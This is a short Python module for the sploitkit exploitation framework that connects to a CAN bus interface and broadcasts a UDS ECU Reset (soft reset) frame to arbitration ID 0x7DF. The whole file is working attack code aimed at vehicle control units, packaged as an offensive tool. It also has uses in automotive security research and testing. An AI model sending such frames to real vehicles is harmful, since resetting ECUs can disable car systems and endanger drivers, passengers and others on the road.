from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class ecu_soft_reset(Module):
    """ This module performs soft reset($03) in the ECU Reset Service Identifier (0x11).

    Author:  shipcod3
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
        Option(
            'ARBID',
            "Arbitration ID (Default: 0x7DF)",
            True,
        ): 0x7DF,
    })

    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Performing ECU Soft Reset...")
        frame = can.Frame(self.config.option('ARBID').value)
        frame.data = [0x02,0x11,0x03,0,0,0,0,0]
        dev.send(frame)
        pass
